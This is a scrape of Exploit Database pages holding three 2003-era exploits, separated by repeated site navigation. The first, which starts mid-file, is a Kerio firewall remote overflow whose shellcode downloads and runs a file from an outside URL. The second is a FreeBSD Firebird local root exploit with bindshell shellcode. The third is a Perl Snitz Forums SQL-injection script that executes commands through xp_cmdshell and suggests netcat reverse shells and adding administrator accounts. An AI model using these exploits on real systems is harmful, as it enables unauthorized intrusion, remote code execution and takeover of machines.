x90\x52\x53\x8B\x45\xCC\xFF\xD0""\x33\xD2\x52\x8B\x45\xC8\xFF\xD0\xE8\xE6\xFD\xFF\xFF\x47\x65\x74\x4D\x6F\x64\x75""\x6C\x65\x48\x61\x6E\x64\x6C\x65\x41\x08\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x64""\x6C\x6C\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x4C\x6F""\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x08\x5F\x6C\x63\x72\x65\x61\x74\x08\x5F""\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x08\x5F""\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78\x65\x63\x08\x45\x78\x69\x74\x50""\x72\x6F\x63\x65\x73\x73\x08\x77\x69\x6E\x69\x6E\x65\x74\x2E\x64\x6C\x6C\x08\x49""\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65""\x74\x4F\x70\x65\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65""\x61\x64\x46\x69\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65""\x48\x61\x6E\x64\x6C\x65\x08\x4E\x53\x08\x6E\x73\x73\x63\x2E\x65\x78\x65\x08""http://reversedhell.net/hackyou.exe""\x08\x01"; // download + exec from the net ; donno who wrote this sc//change the url to whatever, this one pops up an innofensive message box// end of global varsint suck(int sock,int n) // painfull function to get rid of the painfull Kerio protocol{int i=0,j=0,k,a=0,b=0,c=0,d=0;while (i<n){if ((numbytes=recv(sock, buf, n, 0)) == -1) {perror("recv");exit(1);}if (j) i+=(numbytes-1); // ya i know i know :Delse i+=numbytes;for (k=0;k<numbytes;k++) {if (k % 10 == 0) fprintf(stderr,"\n");if (buf[k]==0) fprintf(stderr,"    0 ");else fprintf(stderr," %4.0d ",buf[k]);}fprintf(stderr,"    * ");j++;d=buf[numbytes];c=buf[numbytes-1];b=buf[numbytes-2];a=buf[numbytes-3];if ((i>200) && (a==0x1) && (b==0x0) && (c==0x1) && (d==0x0)) break;}fprintf(stderr,"\n");return i;}int main(int argc, char *argv[]){int sockfd, i,j;struct hostent *he;if (argc != 2) {fprintf(stderr,"usage: ./%s hostname\n",argv[0]);exit(1);}if ((he=gethostbyname(argv[1])) == NULL) {  // get the host infoperror("gethostbyname");exit(1);}if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) { // prepare a socket for connectingperror("socket");exit(1);}their_addr.sin_family = AF_INET;    // host byte ordertheir_addr.sin_port = htons(PORT);  // short, network byte ordertheir_addr.sin_addr = *((struct in_addr *)he->h_addr);memset(&(their_addr.sin_zero), '\0', 8);  // zero the rest of the structif (connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr)) == -1) {perror("connect");exit(1);}fprintf(stderr,"shell len = %d\n",strlen(shellcode));fprintf(stderr,"Connected to firewall.\n");memset(buf,0x0,sizeof(buf));fprintf(stderr,"Sucking buffer..\n");suck(sockfd,266);fprintf(stderr,"\nBuffer sucked by black hole..\n");memset(buf,0x0,sizeof(buf));fprintf(stderr,"-------------------------------------------------\n");fprintf(stderr,"                 - BANNER -   \n");fprintf(stderr,"-------------------------------------------------\n");sleep(1);fprintf(stderr,"coded by Burebista (aanton@reversedhell.net)\n");fprintf(stderr,"           released on - 5 Apr 2003 -\n");sleep(2);fprintf(stderr,"-------------------------------------------------\n");memset(buf,0x90,MAXDATASIZE); // set nops all over// prepares call up to beginning of buffer 32 bit=5 bytesbuf[MAXDATASIZE-1]='\xff'; //buf[MAXDATASIZE-2]='\xff'; // call -1150buf[MAXDATASIZE-3]='\xee'; //buf[MAXDATASIZE-4]='\xab'; //buf[MAXDATASIZE-5]='\xe8'; //j=0;// insert the shellcode in buf at 900for (i=900;j<strlen(shellcode);i++) buf[i]=shellcode[j++];// prepares the new return address (on XPSP1 it is CALL ESP in RPCRT4.DLL)buf[retpos-1]='\x78';buf[retpos-2]='\x07';buf[retpos-3]='\x06';buf[retpos-4]='\x90';// this prepares packet header with negative lengthbuf[0]=0;buf[1]=0;buf[2]=0x14;buf[3]=0xffffff9c; // negative, -100. firewall will prepare// buf of that size. signed integers hit again/*The 4th byte in the packet is the size of what the firewall will be expecting to receiveright ahead. If we send longer buffer then what we told the firewall to expect, it will besimply truncated and nothing cool will happen. The problem is Kerio never thought we couldtell it something that stupid like we are going to send -100 bytes, it is like expecting aclient to buy -20 books from your library, which is an absurdity. There is no checking tomake sure the user input is valid. Again, invalid trusted user input. What they should havedone is either to use the 4th byte inside a modulus, to make sure it is always positive,either lamingly check if it is negative, and if true, stop processing the inputted data.What's so funny?*/if ((send(sockfd, buf,sizeof(buf),0)) == -1 ) { // PASARAN!perror("send");exit(1);}fprintf(stderr,"..pasaran...\n");fprintf(stderr,":D Done!\n");close(sockfd);}// milw0rm.com [2003-05-08]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 29
Firebird 1.0.2 (FreeBSD 4.7-RELEASE) - Local Privilege Escalation - BSD local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDFirebird 1.0.2 (FreeBSD 4.7-RELEASE) - Local Privilege EscalationEDB-ID:29CVE:2003-02812002-2087EDB Verified:Author:bobType:localExploit:/Platform:BSDDate:2003-05-12Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* DSR-firebird.c-------------------------------Tested on: Firebird 1.0.2 FreeBSD 4.7-RELEASEThis is Proof Of concept code.bash-2.05a$ ./DSR-firebird( ( Firebird-1.0.2 Local exploit for Freebsd 4.7 ) )( (                           by - bob@dtors.net ) )----------------------------------------------------Usage: ./DSR-firebird <target#>Targets:1. [0xbfbff75d] - gds_inet_server2. [0xbfbff75c] - gds_lock_mgr3. [0xbfbff75e] - gds_dropbash-2.05a$*/#include <stdio.h>#include <stdlib.h>#include <string.h>#define LOCK    "/usr/local/firebird/bin/gds_lock_mgr"#define DROP    "/usr/local/firebird/bin/gds_drop"#define INET    "/usr/local/firebird/bin/gds_inet_server"#define LEN     1056char dropcode[]="\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f""\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0""\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";char inetcode[]="\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f""\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0""\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";char lockcode[]="\x31\xc0\x31\xdb\xb0\x02\xcd\x80""\x39\xc3\x75\x06\x31\xc0\xb0\x01\xcd\x80""\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80" //setuid[firebird] bybob"\x31\xc0\x31\xdb\x53\xb3\x06\x53" //fork() bindshell by eSDee"\xb3\x01\x53\xb3\x02\x53\x54\xb0""\x61\xcd\x80\x89\xc7\x31\xc0\x50""\x50\x50\x66\x68\xb0\xef\xb7\x02""\x66\x53\x89\xe1\x31\xdb\xb3\x10""\x53\x51\x57\x50\xb0\x68\xcd\x80""\x31\xdb\x39\xc3\x74\x06\x31\xc0""\xb0\x01\xcd\x80\x31\xc0\x50\x57""\x50\xb0\x6a\xcd\x80\x31\xc0\x31""\xdb\x50\x89\xe1\xb3\x01\x53\x89""\xe2\x50\x51\x52\xb3\x14\x53\x50""\xb0\x2e\xcd\x80\x31\xc0\x50\x50""\x57\x50\xb0\x1e\xcd\x80\x89\xc6""\x31\xc0\x31\xdb\xb0\x02\xcd\x80""\x39\xc3\x75\x44\x31\xc0\x57\x50""\xb0\x06\xcd\x80\x31\xc0\x50\x56""\x50\xb0\x5a\xcd\x80\x31\xc0\x31""\xdb\x43\x53\x56\x50\xb0\x5a\xcd""\x80\x31\xc0\x43\x53\x56\x50\xb0""\x5a\xcd\x80\x31\xc0\x50\x68\x2f""\x2f\x73\x68\x68\x2f\x62\x69\x6e""\x89\xe3\x50\x54\x53\x50\xb0\x3b""\xcd\x80\x31\xc0\xb0\x01\xcd\x80""\x31\xc0\x56\x50\xb0\x06\xcd\x80""\xeb\x9a";char *decide(char *string){if(!(strcmp(string, "1")))return((char *)&inetcode);if(!(strcmp(string, "2")))return((char *)&lockcode);if(!(strcmp(string, "3")))return((char *)&dropcode);exit(0);}int main(int argc, char **argv){unsigned long ret = 0xbfbff743;char *selectcode;char buffer[LEN];char egg[1024];char *ptr;int i=0;if(argc < 2){printf("( ( Firebird-1.0.2 Local exploit for Freebsd4.7 ) )\n");printf("( (                           by -bob@dtors.net ) )\n");printf("----------------------------------------------------\n\n");printf("Usage: %s <target#> \n", argv[0]);printf("Targets:\n");printf("1. [0xbfbff743] - gds_inet_server\n");printf("2. [0xbfbff743] - gds_lock_mgr\n");printf("3. [0xbfbff743] - gds_drop\n");printf("\nwww.dtors.net\n");exit(0);}selectcode = (char *)decide(argv[1]);memset(buffer, 0x41, sizeof(buffer));ptr = egg;for (i = 0; i < 1024 - strlen(selectcode) -1; i++) *(ptr++) = 0x90;for (i = 0; i < strlen(selectcode); i++) *(ptr++) = selectcode[i];egg[1024 - 1] = '\0';memcpy(egg,"EGG=",4);putenv(egg);memcpy(&buffer[1052],(char *)&ret,4);buffer[1056] = 0;setenv("INTERBASE", buffer, 1);fprintf(stdout, "Return Address: 0x%x\n", ret);fprintf(stdout, "Buffer Size: %d\n", LEN);fprintf(stdout, "Setuid [90]\n");if(selectcode == (char *)&inetcode){execl(INET, INET, NULL);return 0;}if(selectcode == (char *)&lockcode){printf("\nShell is on port 45295\nExploit will hang!\n");execl(LOCK, LOCK, NULL);return 0;}if(selectcode == (char *)&dropcode){execl(DROP, DROP, NULL);return 0;}return 0;}// milw0rm.com [2003-05-12]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 30
Snitz Forums 3.3.03 - Remote Command Execution - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSnitz Forums 3.3.03 - Remote Command ExecutionEDB-ID:30CVE:2004-2720EDB Verified:Author:anonymousType:remoteExploit:/Platform:WindowsDate:2003-05-12Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perluse Socket;print "\nRemote command execution against Snitz Forums 3.3.03 (and probably others).\n";print "You accept full responsibility for your actions by using this script.\n";print "INTERNAL USE ONLY!! DO NOT DISTRIBUTE!!\n";print "\nWeb server? [www.enterthegame.com]: ";my $webserver = <STDIN>;chomp $webserver;if( $webserver eq "" ){$webserver = "www.enterthegame.com";}print "\nWeb server port? [80]: ";my $port = <STDIN>;chomp $port;if( $port eq "" ){$port = 80;}print "\nAbsolute path to \"register.asp\"? [/forum/register.asp]: ";my $path = <STDIN>;chomp $path;if( $path eq "" ){$path = "/forum/register.asp";}print "\nCommand to execute non-interactively\n";print " Example commands: tftp -i Your.IP.Here GET nc.exe\n";print " nc.exe -e cmd.exe Your.IP.Here YourNetcatListeningPortHere\n";print " or: net user h4x0r /add | net localgroup Administrators h4x0r /add\n";print "Your command: ";my $command = <STDIN>;chomp $command;$command =~ s/\ /\%20/g;if( open_TCP( FILEHANDLE, $webserver, 80 ) == undef ){print "Error connecting to $webserver\n";exit( 0 );}else{my $data1 = $path . "\?mode\=DoIt";my $data2 = "Email\=\'\%20exec\%20master..xp_cmdshell\%20\'" . $command. "\'\%20--\&Name\=snitz";my $length = length( $data2 );print FILEHANDLE "POST $data1 HTTP/1.1\n";if( $port == 80 ){print FILEHANDLE "Host: $webserver\n";}else{print FILEHANDLE "Host: $webserver:$port\n";}print FILEHANDLE "Accept: */*\n";print FILEHANDLE "User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\n";print FILEHANDLE "Keep-Alive: 300\n";print FILEHANDLE "Referer: http:\/\/$webserver$path\?mode\=Register\n";print FILEHANDLE "Content-Type: application/x-www-form-urlencoded\n";print FILEHANDLE "Content-Length: $length\n\n";print FILEHANDLE "$data2";print "\nSQL injection command sent. If you are waiting for a shell on your listening\n";print "netcat, hit \"enter\" a couple of times to be safe.\n\n";close( FILEHANDLE );}sub open_TCP{my( $FS, $dest, $port ) = @_;my $proto = getprotobyname( 'tcp' );socket( $FS, PF_INET, SOCK_STREAM, $proto );my $sin = sockaddr_in( $port, inet_aton( $dest ));connect( $FS, $sin ) || return undef;my $old_fh = select( $FS );$| = 1;select( $old_fh );return 1;}# milw0rm.com [2003-05-12]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration 